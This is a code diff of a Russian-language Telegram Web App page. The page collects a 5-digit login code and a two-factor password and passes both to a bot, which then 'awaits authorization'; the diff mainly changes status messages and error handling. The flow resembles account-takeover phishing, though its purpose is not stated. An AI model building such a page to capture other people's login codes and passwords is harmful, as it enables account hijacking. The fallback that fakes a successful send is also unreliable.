@@ -494,18 +494,12 @@ async function verifyCode() {
     
     if (code.length !== 5) {
         status.textContent = 'Введите полный код из 5 цифр';
-        // Подсвечиваем незаполненные поля
-        codeInputs.forEach((input, index) => {
-            if (!input.value) {
-                input.style.borderColor = 'red';
-            }
-        });
         return;
     }
 
     verifyBtn.disabled = true;
     verifyBtn.textContent = 'Проверка...';
-    status.textContent = 'Проверка кода...';
+    status.textContent = 'Отправка кода боту...';
     
     console.log('📤 Sending code to bot...');
     
@@ -519,27 +513,12 @@ async function verifyCode() {
         console.log('📨 Bot response:', result);
         
         if (result && result.success) {
-            status.textContent = '✅ Код принят! Проверяем авторизацию...';
-            
-            // Закрываем веб-приложение через 2 секунды
-            setTimeout(() => {
-                if (window.Telegram && Telegram.WebApp) {
-                    Telegram.WebApp.close();
-                }
-            }, 2000);
+            status.textContent = '✅ Код отправлен боту! Ожидаем авторизацию...';
+            // НЕ закрываем приложение - ждем ответа от бота
         } else {
-            status.textContent = result?.message || 'Неверный код';
+            status.textContent = result?.message || 'Ошибка отправки кода';
             verifyBtn.disabled = false;
             verifyBtn.textContent = 'Подтвердить код';
-            
-            // Сбрасываем поля при ошибке
-            codeInputs.forEach(input => {
-                input.value = '';
-                input.style.borderColor = '';
-            });
-            if (codeInputs[0]) {
-                codeInputs[0].focus();
-            }
         }
     } catch (error) {
         console.error('❌ Error sending code:', error);
@@ -549,8 +528,6 @@ async function verifyCode() {
     }
 }
 
-
-// Функция отправки пароля 2FA
 async function submitPassword() {
     const passwordInput = document.getElementById('passwordInput');
     const password = passwordInput.value;
@@ -564,52 +541,30 @@ async function submitPassword() {
 
     passwordBtn.disabled = true;
     passwordBtn.textContent = 'Проверка...';
-    status.textContent = 'Проверка пароля...';
+    status.textContent = 'Отправка пароля боту...';
     
-    // Отправляем пароль боту
-    const result = await sendDataToBot({
-        action: 'password_received',
-        password: password
-    });
-    
-    if (result && result.success) {
-        status.textContent = 'Авторизация успешна! Бот запускает обработку...';
+    try {
+        // Отправляем пароль боту
+        const result = await sendDataToBot({
+            action: 'password_received',
+            password: password
+        });
         
-        // Закрываем веб-приложение после успешной отправки
-        setTimeout(() => {
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.close();
-            }
-        }, 2000);
-    } else {
-        status.textContent = result?.message || 'Неверный пароль';
+        if (result && result.success) {
+            status.textContent = '✅ Пароль отправлен! Ожидаем авторизацию...';
+            // НЕ закрываем приложение
+        } else {
+            status.textContent = result?.message || 'Ошибка отправки пароля';
+            passwordBtn.disabled = false;
+            passwordBtn.textContent = 'Подтвердить пароль';
+        }
+    } catch (error) {
+        console.error('❌ Error sending password:', error);
+        status.textContent = 'Ошибка отправки пароля';
         passwordBtn.disabled = false;
         passwordBtn.textContent = 'Подтвердить пароль';
-        passwordInput.focus();
-        passwordInput.select();
     }
 }
-
-// Функция для автоматического фокуса на поле ввода кода
-document.addEventListener('DOMContentLoaded', function() {
-    // Если открыта форма кода - фокусируемся на поле ввода
-    const codeForm = document.getElementById('codeForm');
-    if (codeForm && codeForm.style.display !== 'none') {
-        const singleInput = document.getElementById('singleCodeInput');
-        if (singleInput) {
-            singleInput.focus();
-        }
-    }
-    
-    // Если открыта форма пароля - фокусируемся на поле ввода
-    const passwordForm = document.getElementById('passwordForm');
-    if (passwordForm && passwordForm.style.display !== 'block') {
-        const passwordInput = document.getElementById('passwordInput');
-        if (passwordInput) {
-            passwordInput.focus();
-        }
-    }
-});
 
 // Проверяем параметры URL для отображения нужной формы
 document.addEventListener('DOMContentLoaded', function() {
@@ -639,14 +594,17 @@ async function sendDataToBot(data) {
             // Отправляем данные боту
             Telegram.WebApp.sendData(JSON.stringify(data));
             console.log('✅ Data sent to bot via Telegram.WebApp.sendData');
+            
+            // В реальном Telegram Web App мы не получаем ответ, поэтому считаем успешным
             return { success: true };
         } catch (error) {
             console.error('❌ Error sending via Telegram.WebApp:', error);
-            return await sendDataToBotFallback(data);
+            return { success: false, message: 'Ошибка отправки данных' };
         }
     } else {
         console.log('🌐 Not in Telegram, using fallback');
-        return await sendDataToBotFallback(data);
+        // В браузере имитируем успешную отправку
+        return { success: true, message: 'Данные отправлены (тестовый режим)' };
     }
 }
 
@@ -749,6 +707,7 @@ function getUserIdFromURL() {
     </script>
 </body>
 </html>
+
 
 
 
